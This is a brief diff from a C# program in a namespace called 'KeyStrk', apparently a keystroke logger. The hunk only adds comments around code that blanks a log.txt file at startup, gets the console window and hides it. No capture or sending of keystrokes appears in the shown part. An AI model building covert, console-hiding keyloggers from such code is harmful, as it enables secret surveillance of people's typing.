@@ -19,10 +19,12 @@ namespace KeyStrk
         private static float startTime = 0f;
 
         public static void Main()
-        {
+        {   
+            //Create log file if file exists make it blank 
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
-
+            
+            // Get console
             var handle = GetConsoleWindow();
 
             // Hide Console 
